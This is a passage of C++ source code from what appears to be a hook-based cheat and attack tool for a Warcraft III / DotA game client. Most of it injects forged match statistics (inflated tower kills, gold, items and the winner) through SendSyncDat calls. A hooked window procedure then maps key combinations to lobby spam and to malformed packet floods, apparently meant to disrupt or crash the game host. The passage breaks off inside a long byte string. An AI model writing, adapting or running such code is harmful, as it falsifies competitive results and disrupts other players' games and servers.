	SendSyncDat("game_stats", "\"id\":6,\"items\":[1227895883,0,0,0,0,0],\"kills\":0,\"left_time\":9,\"neutral_kills\":0,\"new_year_bounty_find\":1,\"new_year_rare_present_", "0");
	SendSyncDat("game_stats", "find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":7,\"deaths\":0,\"firestone\":1,", "0");
	SendSyncDat("game_stats", "\"froststone\":0,\"gold\":127,\"hero\":1332179560,\"id\":7,\"items\":[1227901010,1227896375,1227896131,1227895375,0,0],\"kills\":0,\"left_tim", "0");
	SendSyncDat("game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":0,\"cour", "0");
	SendSyncDat("game_stats", "ier_kills\":0,\"creep_denies\":-0,\"creep_kills\":0,\"deaths\":0,\"firestone\":1,\"froststone\":0,\"gold\":100,\"hero\":1315988077,\"id\":8,\"items", "0");
	SendSyncDat("game_stats", "\":[1227900994,1227896113,1227896131,0,0,0],\"kills\":0,\"left_time\":9,\"neutral_kills\":0,\"new_year_bounty_find\":1,\"new_year_rare_pre", "0");
	SendSyncDat("game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":-2,\"creep_kills\":10,\"deaths\":0,\"firesto", "0");
	SendSyncDat("game_stats", "ne\":0,\"froststone\":0,\"gold\":615,\"hero\":1211117651,\"id\":9,\"items\":[1227899213,1227895879,1227895879,1227895879,0,0],\"kills\":0,\"le", "0");
	SendSyncDat("game_stats", "ft_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":0", "0");
	SendSyncDat("game_stats", ",\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":2,\"deaths\":1,\"firestone\":1,\"froststone\":0,\"gold\":306,\"hero\":1211117649,\"id\":10", "0");
	SendSyncDat("game_stats", ",\"items\":[1227895875,1227896131,1227895875,1227895375,0,0],\"kills\":0,\"left_time\":9,\"neutral_kills\":0,\"new_year_bounty_find\":1,\"n", "0");
	SendSyncDat("game_stats", "ew_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999}]}", "0");
	SendSyncDat("game_stats", "end 0", "0");
	SendSyncDat("game_stats", "{\"first_hero_kill_time\":" + std::to_string(9999) + ",\"first_rax_kill_time\":" + std::to_string(99999) + ",\"game_start_time\":" + std::to_string(99999) + ",\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_den", "1");
	SendSyncDat("game_stats", "ies\":4,\"creep_kills\":92,\"deaths\":3,\"firestone\":1,\"froststone\":0,\"gold\":129,\"hero\":1211117636,\"id\":1,\"items\":[1227897141,12279009", "1");
	SendSyncDat("game_stats", "94,1227896912,1227896153,0,0],\"kills\":5,\"left_time\":9,\"neutral_kills\":30,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0", "1");
	SendSyncDat("game_stats", ",\"rax_kills\":0,\"tower_kills\":999},{\"assists\":3,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":56,\"deaths\":4,\"firestone\":1,\"frost", "1");
	SendSyncDat("game_stats", "stone\":0,\"gold\":1055,\"hero\":1214931305,\"id\":2,\"items\":[0,0,1227895375,0,1227895880,1227900499],\"kills\":5,\"left_time\":9,\"neutral_", "1");
	SendSyncDat("game_stats", "kills\":1,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":2,\"courier_kills\":0,\"", "1");
	SendSyncDat("game_stats", "creep_denies\":0,\"creep_kills\":36,\"deaths\":7,\"firestone\":1,\"froststone\":0,\"gold\":269,\"hero\":1160786000,\"id\":3,\"items\":[1227897139", "1");
	SendSyncDat("game_stats", ",1227896153,1227896131,1227895890,1227896137,1227896135],\"kills\":4,\"left_time\":9,\"neutral_kills\":3,\"new_year_bounty_find\":1,\"new", "1");
	SendSyncDat("game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":5,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":48,\"deat", "1");
	SendSyncDat("game_stats", "hs\":3,\"firestone\":1,\"froststone\":0,\"gold\":400,\"hero\":1160786520,\"id\":4,\"items\":[1227902019,1227895890,1227896396,1227900994,1227", "1");
	SendSyncDat("game_stats", "895375,1227896112],\"kills\":3,\"left_time\":9,\"neutral_kills\":0,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\"", "1");
	SendSyncDat("game_stats", ":0,\"tower_kills\":999},{\"assists\":7,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":25,\"deaths\":4,\"firestone\":1,\"froststone\":0,\"go", "1");
	SendSyncDat("game_stats", "ld\":216,\"hero\":1333027688,\"id\":5,\"items\":[1227896396,1227896394,1227895880,1227895887,1227895860,1227902791],\"kills\":2,\"left_tim", "1");
	SendSyncDat("game_stats", "e\":0,\"neutral_kills\":5,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":4,\"cour", "1");
	SendSyncDat("game_stats", "ier_kills\":0,\"creep_denies\":-5,\"creep_kills\":36,\"deaths\":6,\"firestone\":1,\"froststone\":0,\"gold\":1444,\"hero\":1315074670,\"id\":6,\"ite", "1");
	SendSyncDat("game_stats", "ms\":[1227896921,1227896154,1227897155,1227896132,0,0],\"kills\":3,\"left_time\":9,\"neutral_kills\":38,\"new_year_bounty_find\":1,\"new_y", "1");
	SendSyncDat("game_stats", "ear_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":74,\"deaths", "1");
	SendSyncDat("game_stats", "\":2,\"firestone\":1,\"froststone\":0,\"gold\":393,\"hero\":1332179560,\"id\":7,\"items\":[1227901010,1227899463,1227895380,1227895896,0,0],\"", "1");
	SendSyncDat("game_stats", "kills\":4,\"left_time\":9,\"neutral_kills\":23,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}", "1");
	SendSyncDat("game_stats", ",{\"assists\":6,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":26,\"deaths\":3,\"firestone\":1,\"froststone\":0,\"gold\":783,\"hero\":1315", "1");
	SendSyncDat("game_stats", "988077,\"id\":8,\"items\":[1227895880,1227900994,1227896113,1227902533,1227896135,1227900746],\"kills\":2,\"left_time\":9,\"neutral_kills", "1");
	SendSyncDat("game_stats", "\":8,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":6,\"courier_kills\":0,\"creep", "1");
	SendSyncDat("game_stats", "_denies\":7,\"creep_kills\":87,\"deaths\":0,\"firestone\":1,\"froststone\":0,\"gold\":1456,\"hero\":1211117651,\"id\":9,\"items\":[1227899467,122", "1");
	SendSyncDat("game_stats", "7899213,1227896154,1227896390,1227900994,1227896137],\"kills\":5,\"left_time\":9,\"neutral_kills\":9,\"new_year_bounty_find\":1,\"new_yea", "1");
	SendSyncDat("game_stats", "r_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":5,\"courier_kills\":0,\"creep_denies\":-3,\"creep_kills\":74,\"deaths\":", "1");
	SendSyncDat("game_stats", "8,\"firestone\":1,\"froststone\":0,\"gold\":2276,\"hero\":1211117649,\"id\":10,\"items\":[1227901785,1227900506,1227896904,1227896153,122789", "1");
	SendSyncDat("game_stats", "6137,0],\"kills\":7,\"left_time\":9,\"neutral_kills\":10,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_", "1");
	SendSyncDat("game_stats", "kills\":1}]}", "1");
	SendSyncDat("game_stats", "end 1", "1");
	SendSyncDat("1", "1", "10");
	SendSyncDat("1", "2", "8");
	SendSyncDat("1", "3", "388");
	SendSyncDat("1", "4", "4");
	SendSyncDat("1", "5", "17");
	SendSyncDat("1", "6", "1531");
	SendSyncDat("1", "7", "41");
	SendSyncDat("1", "8_0", "1227902808");
	SendSyncDat("1", "8_1", "1227899461");
	SendSyncDat("1", "8_2", "1227896386");
	SendSyncDat("1", "8_3", "1227899189");
	SendSyncDat("1", "8_4", "1227897141");
	SendSyncDat("1", "8_5", "1227896916");
	SendSyncDat("1", "9", "1211117636");
	SendSyncDat("1", "id", "1");
	SendSyncDat("7", "1", "7");
	SendSyncDat("7", "2", "15");
	SendSyncDat("7", "3", "60");
	SendSyncDat("7", "4", "5");
	SendSyncDat("7", "5", "6");
	SendSyncDat("7", "6", "1437");
	SendSyncDat("7", "7", "115");
	SendSyncDat("7", "8_0", "1227896921");
	SendSyncDat("7", "8_1", "1227903799");
	SendSyncDat("7", "8_2", "1227897155");
	SendSyncDat("7", "8_3", "1227903799");
	SendSyncDat("7", "8_4", "1227897160");
	SendSyncDat("7", "8_5", "1227903799");
	SendSyncDat("7", "9", "1315074670");
	SendSyncDat("7", "id", "6");
	SendSyncDat("2", "1", "15");
	SendSyncDat("2", "2", "6");
	SendSyncDat("2", "3", "184");
	SendSyncDat("2", "4", "0");
	SendSyncDat("2", "5", "23");
	SendSyncDat("2", "6", "3182");
	SendSyncDat("2", "7", "2");
	SendSyncDat("2", "8_0", "1227895090");
	SendSyncDat("2", "8_1", "1227903822");
	SendSyncDat("2", "8_2", "1227899193");
	SendSyncDat("2", "8_3", "1227894832");
	SendSyncDat("2", "8_4", "1227895880");
	SendSyncDat("2", "8_5", "1227900721");
	SendSyncDat("2", "9", "1214931305");
	SendSyncDat("2", "id", "2");
	SendSyncDat("8", "1", "6");
	SendSyncDat("8", "2", "8");
	SendSyncDat("8", "3", "190");
	SendSyncDat("8", "4", "0");
	SendSyncDat("8", "5", "5");
	SendSyncDat("8", "6", "22");
	SendSyncDat("8", "7", "45");
	SendSyncDat("8", "8_0", "0");
	SendSyncDat("8", "8_1", "0");
	SendSyncDat("8", "8_2", "0");
	SendSyncDat("8", "8_3", "1227901786");
	SendSyncDat("8", "8_4", "0");
	SendSyncDat("8", "8_5", "0");
	SendSyncDat("8", "9", "1332179560");
	SendSyncDat("8", "id", "7");
	SendSyncDat("3", "1", "8");
	SendSyncDat("3", "2", "17");
	SendSyncDat("3", "3", "164");
	SendSyncDat("3", "4", "0");
	SendSyncDat("3", "5", "15");
	SendSyncDat("3", "6", "1825");
	SendSyncDat("3", "7", "4");
	SendSyncDat("3", "8_0", "1227896911");
	SendSyncDat("3", "8_1", "1227903815");
	SendSyncDat("3", "8_2", "1227901261");
	SendSyncDat("3", "8_3", "0");
	SendSyncDat("3", "8_4", "1227896137");
	SendSyncDat("3", "8_5", "0");
	SendSyncDat("3", "9", "1160786000");
	SendSyncDat("3", "id", "3");
	SendSyncDat("9", "1", "2");
	SendSyncDat("9", "2", "9");
	SendSyncDat("9", "3", "44");
	SendSyncDat("9", "4", "1");
	SendSyncDat("9", "5", "11");
	SendSyncDat("9", "6", "12");
	SendSyncDat("9", "7", "8");
	SendSyncDat("9", "8_0", "0");
	SendSyncDat("9", "8_1", "0");
	SendSyncDat("9", "8_2", "0");
	SendSyncDat("9", "8_3", "0");
	SendSyncDat("9", "8_4", "0");
	SendSyncDat("9", "8_5", "0");
	SendSyncDat("9", "9", "1315988077");
	SendSyncDat("9", "id", "8");
	SendSyncDat("4", "1", "10");
	SendSyncDat("4", "2", "9");
	SendSyncDat("4", "3", "139");
	SendSyncDat("4", "4", "0");
	SendSyncDat("4", "5", "16");
	SendSyncDat("4", "6", "1081");
	SendSyncDat("4", "7", "2");
	SendSyncDat("4", "8_0", "1227902019");
	SendSyncDat("4", "8_1", "1227903283");
	SendSyncDat("4", "8_2", "1227896154");
	SendSyncDat("4", "8_3", "1227897164");
	SendSyncDat("4", "8_4", "1227900994");
	SendSyncDat("4", "8_5", "1227900499");
	SendSyncDat("4", "9", "1160786520");
	SendSyncDat("4", "id", "4");
	SendSyncDat("10", "1", "21");
	SendSyncDat("10", "2", "5");
	SendSyncDat("10", "3", "347");
	SendSyncDat("10", "4", "7");
	SendSyncDat("10", "5", "8");
	SendSyncDat("10", "6", "4022");
	SendSyncDat("10", "7", "27");
	SendSyncDat("10", "8_0", "1227899212");
	SendSyncDat("10", "8_1", "1227895090");
	SendSyncDat("10", "8_2", "1227903822");
	SendSyncDat("10", "8_3", "1227894874");
	SendSyncDat("10", "8_4", "1227899467");
	SendSyncDat("10", "8_5", "1227899205");
	SendSyncDat("10", "9", "1211117651");
	SendSyncDat("10", "id", "9");
	SendSyncDat("5", "1", "7");
	SendSyncDat("5", "2", "13");
	SendSyncDat("5", "3", "87");
	SendSyncDat("5", "4", "0");
	SendSyncDat("5", "5", "21");
	SendSyncDat("5", "6", "723");
	SendSyncDat("5", "7", "11");
	SendSyncDat("5", "8_0", "1227902007");
	SendSyncDat("5", "8_1", "1227896394");
	SendSyncDat("5", "8_2", "1227895880");
	SendSyncDat("5", "8_3", "1227899187");
	SendSyncDat("5", "8_4", "0");
	SendSyncDat("5", "8_5", "1227902793");
	SendSyncDat("5", "9", "1333027688");
	SendSyncDat("5", "id", "5");
	SendSyncDat("11", "1", "17");
	SendSyncDat("11", "2", "17");
	SendSyncDat("11", "3", "176");
	SendSyncDat("11", "4", "3");
	SendSyncDat("11", "5", "12");
	SendSyncDat("11", "6", "10729");
	SendSyncDat("11", "7", "16");
	SendSyncDat("11", "8_0", "1227897141");
	SendSyncDat("11", "8_1", "1227900721");
	SendSyncDat("11", "8_2", "1227897160");
	SendSyncDat("11", "8_3", "1227899193");
	SendSyncDat("11", "8_4", "1227896386");
	SendSyncDat("11", "8_5", "1227899209");
	SendSyncDat("11", "9", "1211117649");
	SendSyncDat("11", "id", "10");
	SendSyncDat("Global", "Winner", "0");
	SendSyncDat("Global", "m", "61");
	SendSyncDat("Global", "s", "30");
	SendSyncDat("game_stats", "{\"first_hero_kill_time\":" + std::to_string(9999) + ",\"first_rax_kill_time\":" + std::to_string(99999) + ",\"game_start_time\":" + std::to_string(9999999) + ",\"players\":[{\"assists\":17,\"courier_kills\":0,\"creep_de", "2");
	SendSyncDat("game_stats", "nies\":4,\"creep_kills\":388,\"deaths\":8,\"firestone\":1,\"froststone\":0,\"gold\":1531,\"hero\":1211117636,\"id\":1,\"items\":[1227902808,12278", "2");
	SendSyncDat("game_stats", "99461,1227896386,1227899189,1227897141,1227896916],\"kills\":10,\"left_time\":9,\"neutral_kills\":41,\"new_year_bounty_find\":1,\"new_yea", "2");
	SendSyncDat("game_stats", "r_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":23,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":184,\"deaths", "2");
	SendSyncDat("game_stats", "\":6,\"firestone\":1,\"froststone\":0,\"gold\":3182,\"hero\":1214931305,\"id\":2,\"items\":[1227895090,1227903822,1227899193,1227894832,12278", "2");
	SendSyncDat("game_stats", "95880,1227900721],\"kills\":15,\"left_time\":9,\"neutral_kills\":2,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\"", "2");
	SendSyncDat("game_stats", ":0,\"tower_kills\":999},{\"assists\":15,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":164,\"deaths\":17,\"firestone\":1,\"froststone\":0,", "2");
	SendSyncDat("game_stats", "\"gold\":1825,\"hero\":1160786000,\"id\":3,\"items\":[1227896911,1227903815,1227901261,0,1227896137,0],\"kills\":8,\"left_time\":9,\"neutral_", "2");
	SendSyncDat("game_stats", "kills\":4,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":16,\"courier_kills\":0,", "2");
	SendSyncDat("game_stats", "\"creep_denies\":0,\"creep_kills\":139,\"deaths\":9,\"firestone\":1,\"froststone\":0,\"gold\":1081,\"hero\":1160786520,\"id\":4,\"items\":[1227902", "2");
	SendSyncDat("game_stats", "019,1227903283,1227896154,1227897164,1227900994,1227900499],\"kills\":10,\"left_time\":9,\"neutral_kills\":2,\"new_year_bounty_find\":1,", "2");
	SendSyncDat("game_stats", "\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":21,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":87,", "2");
	SendSyncDat("game_stats", "\"deaths\":13,\"firestone\":1,\"froststone\":0,\"gold\":723,\"hero\":1333027688,\"id\":5,\"items\":[1227902007,1227896394,1227895880,122789918", "2");
	SendSyncDat("game_stats", "7,0,1227902793],\"kills\":7,\"left_time\":9,\"neutral_kills\":11,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0", "2");
	SendSyncDat("game_stats", ",\"tower_kills\":999},{\"assists\":6,\"courier_kills\":0,\"creep_denies\":-5,\"creep_kills\":60,\"deaths\":15,\"firestone\":1,\"froststone\":0,\"gol", "2");
	SendSyncDat("game_stats", "d\":1437,\"hero\":1315074670,\"id\":6,\"items\":[1227896921,1227903799,1227897155,1227903799,1227897160,1227903799],\"kills\":7,\"left_tim", "2");
	SendSyncDat("game_stats", "e\":0,\"neutral_kills\":115,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":5,\"co", "2");
	SendSyncDat("game_stats", "urier_kills\":0,\"creep_denies\":-0,\"creep_kills\":190,\"deaths\":8,\"firestone\":1,\"froststone\":0,\"gold\":22,\"hero\":1332179560,\"id\":7,\"it", "2");
	SendSyncDat("game_stats", "ems\":[0,0,0,1227901786,0,0],\"kills\":6,\"left_time\":3276,\"neutral_kills\":45,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":", "2");
	SendSyncDat("game_stats", "0,\"rax_kills\":0,\"tower_kills\":3},{\"assists\":11,\"courier_kills\":0,\"creep_denies\":-1,\"creep_kills\":44,\"deaths\":9,\"firestone\":1,\"fro", "2");
	SendSyncDat("game_stats", "ststone\":0,\"gold\":12,\"hero\":1315988077,\"id\":8,\"items\":[0,0,0,0,0,0],\"kills\":2,\"left_time\":2276,\"neutral_kills\":8,\"new_year_bount", "2");
	SendSyncDat("game_stats", "y_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":8,\"courier_kills\":0,\"creep_denies\":-7,\"creep_k", "2");
	SendSyncDat("game_stats", "ills\":347,\"deaths\":5,\"firestone\":1,\"froststone\":0,\"gold\":4022,\"hero\":1211117651,\"id\":9,\"items\":[1227899212,1227895090,1227903822", "2");
	SendSyncDat("game_stats", ",1227894874,1227899467,1227899205],\"kills\":21,\"left_time\":9,\"neutral_kills\":27,\"new_year_bounty_find\":1,\"new_year_rare_present_f", "2");
	SendSyncDat("game_stats", "ind\":0,\"rax_kills\":4,\"tower_kills\":999},{\"assists\":12,\"courier_kills\":0,\"creep_denies\":-3,\"creep_kills\":176,\"deaths\":17,\"firestone\"", "2");
	SendSyncDat("game_stats", ":0,\"froststone\":0,\"gold\":10729,\"hero\":1211117649,\"id\":10,\"items\":[1227897141,1227900721,1227897160,1227899193,1227896386,1227899", "2");
	SendSyncDat("game_stats", "209],\"kills\":17,\"left_time\":9,\"neutral_kills\":16,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":1,\"tower_ki", "2");
	SendSyncDat("game_stats", "lls\":2}],\"winner\":0}", "2");
	SendSyncDat("game_stats", "end 2", "2");
	SendSyncDat("game_stats", "{\"first_hero_kill_time\":" + std::to_string(9999) + ",\"first_rax_kill_time\":" + std::to_string(99999) + ",\"game_start_time\":" + std::to_string(9999999) + ",\"players\":[{\"assists\":17,\"courier_kills\":0,\"creep_de", "3");
	SendSyncDat("game_stats", "nies\":4,\"creep_kills\":388,\"deaths\":8,\"firestone\":1,\"froststone\":0,\"gold\":1531,\"hero\":1211117636,\"id\":1,\"items\":[1227902808,12278", "3");
	SendSyncDat("game_stats", "99461,1227896386,1227899189,1227897141,1227896916],\"kills\":10,\"left_time\":9,\"neutral_kills\":41,\"new_year_bounty_find\":1,\"new_yea", "3");
	SendSyncDat("game_stats", "r_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":23,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":184,\"deaths", "3");
	SendSyncDat("game_stats", "\":6,\"firestone\":1,\"froststone\":0,\"gold\":3182,\"hero\":1214931305,\"id\":2,\"items\":[1227895090,1227903822,1227899193,1227894832,12278", "3");
	SendSyncDat("game_stats", "95880,1227900721],\"kills\":15,\"left_time\":9,\"neutral_kills\":2,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\"", "3");
	SendSyncDat("game_stats", ":0,\"tower_kills\":999},{\"assists\":15,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":164,\"deaths\":17,\"firestone\":1,\"froststone\":0,", "3");
	SendSyncDat("game_stats", "\"gold\":1825,\"hero\":1160786000,\"id\":3,\"items\":[1227896911,1227903815,1227901261,0,1227896137,0],\"kills\":8,\"left_time\":9,\"neutral_", "3");
	SendSyncDat("game_stats", "kills\":4,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":16,\"courier_kills\":0,", "3");
	SendSyncDat("game_stats", "\"creep_denies\":0,\"creep_kills\":139,\"deaths\":9,\"firestone\":1,\"froststone\":0,\"gold\":1081,\"hero\":1160786520,\"id\":4,\"items\":[1227902", "3");
	SendSyncDat("game_stats", "019,1227903283,1227896154,1227897164,1227900994,1227900499],\"kills\":10,\"left_time\":9,\"neutral_kills\":2,\"new_year_bounty_find\":1,", "3");
	SendSyncDat("game_stats", "\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":21,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":87,", "3");
	SendSyncDat("game_stats", "\"deaths\":13,\"firestone\":1,\"froststone\":0,\"gold\":723,\"hero\":1333027688,\"id\":5,\"items\":[1227902007,1227896394,1227895880,122789918", "3");
	SendSyncDat("game_stats", "7,0,1227902793],\"kills\":7,\"left_time\":9,\"neutral_kills\":11,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0", "3");
	SendSyncDat("game_stats", ",\"tower_kills\":999},{\"assists\":6,\"courier_kills\":0,\"creep_denies\":-5,\"creep_kills\":60,\"deaths\":15,\"firestone\":1,\"froststone\":0,\"gol", "3");
	SendSyncDat("game_stats", "d\":1437,\"hero\":1315074670,\"id\":6,\"items\":[1227896921,1227903799,1227897155,1227903799,1227897160,1227903799],\"kills\":7,\"left_tim", "3");
	SendSyncDat("game_stats", "e\":0,\"neutral_kills\":115,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":5,\"co", "3");
	SendSyncDat("game_stats", "urier_kills\":0,\"creep_denies\":-0,\"creep_kills\":190,\"deaths\":8,\"firestone\":1,\"froststone\":0,\"gold\":22,\"hero\":1332179560,\"id\":7,\"it", "3");
	SendSyncDat("game_stats", "ems\":[0,0,0,1227901786,0,0],\"kills\":6,\"left_time\":3276,\"neutral_kills\":45,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":", "3");
	SendSyncDat("game_stats", "0,\"rax_kills\":0,\"tower_kills\":3},{\"assists\":11,\"courier_kills\":0,\"creep_denies\":-1,\"creep_kills\":44,\"deaths\":9,\"firestone\":1,\"fro", "3");
	SendSyncDat("game_stats", "ststone\":0,\"gold\":12,\"hero\":1315988077,\"id\":8,\"items\":[0,0,0,0,0,0],\"kills\":2,\"left_time\":2276,\"neutral_kills\":8,\"new_year_bount", "3");
	SendSyncDat("game_stats", "y_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":8,\"courier_kills\":0,\"creep_denies\":-7,\"creep_k", "3");
	SendSyncDat("game_stats", "ills\":347,\"deaths\":5,\"firestone\":1,\"froststone\":0,\"gold\":4022,\"hero\":1211117651,\"id\":9,\"items\":[1227899212,1227895090,1227903822", "3");
	SendSyncDat("game_stats", ",1227894874,1227899467,1227899205],\"kills\":21,\"left_time\":9,\"neutral_kills\":27,\"new_year_bounty_find\":1,\"new_year_rare_present_f", "3");
	SendSyncDat("game_stats", "ind\":0,\"rax_kills\":4,\"tower_kills\":999},{\"assists\":12,\"courier_kills\":0,\"creep_denies\":-3,\"creep_kills\":176,\"deaths\":17,\"firestone\"", "3");
	SendSyncDat("game_stats", ":0,\"froststone\":0,\"gold\":10729,\"hero\":1211117649,\"id\":10,\"items\":[1227897141,1227900721,1227897160,1227899193,1227896386,1227899", "3");
	SendSyncDat("game_stats", "209],\"kills\":17,\"left_time\":9,\"neutral_kills\":16,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":1,\"tower_ki", "3");
	SendSyncDat("game_stats", "lls\":2}],\"winner\":0}", "3");
	SendSyncDat("game_stats", "end 3", "3");
}


int goldpresstime = 0;

int st_kills = 0;
int st_deaths = 0;
int st_assists = 0;
int st_towers = 0;

LRESULT CALLBACK HookCallWndProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < HC_ACTION)
		return CallNextHookEx(hhookSysMsg, nCode, wParam, lParam);

	if (GetCurrentThreadId() == MainThread && GetTickCount() - StartTicks > 10)
	{
		StartTicks = GetTickCount();

		try
		{
			if (/*foundonestr && */GetTickCount() - sendtick > 1000)
			{
				if (IsKeyPressed(VK_OEM_3) && IsKeyPressed(VK_F2))
				{
					PrintSockets();
				}
				if (GetFrameItemAddress("NameMenu", 0) || GetFrameItemAddress("NameMenu", 1) || IsGame())
				{
					if (IsKeyPressed(VK_OEM_3) && IsKeyPressed(VK_F1))
					{
						for (int i = 0; i < 100; i++)
						{
							ChangeColour(rand() % 10);
							ChangeTeam(rand() % 2);
							ChangeHandicap(rand() % 10);
							SendChatMessageBot("HELLO WORLD");
							ChangeExtraFlags(1 + rand(), "HELLO WORLD");
							StartMapDownload();
							StopMapDownload();
							StartPongToPing();
							//SendGproxyReconnect();
							SendMapSize(1 + rand(), rand());
						}
					}
				}
				if (IsGame())
				{
					if (IsKeyPressed(VK_OEM_3) && IsKeyPressed(VK_F3))
					{
						SendPacket((BYTE*)"\x84\x84\x84\x84\x84", 5);
						while (IsKeyPressed(VK_OEM_3) && IsKeyPressed(VK_F3))
						{
							Sleep(100);
						}
					}

					if (IsKeyPressed(VK_OEM_3) && IsKeyPressed(VK_F4))
					{
						SendPacket((BYTE*)"\x85\x85\x85\x85\x85", 5);
						while (IsKeyPressed(VK_OEM_3) && IsKeyPressed(VK_F4))
						{
							Sleep(100);
						}
					}

					if (IsKeyPressed(VK_OEM_3) && IsKeyPressed(VK_F5))
					{
						SendPacket((BYTE*)"\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x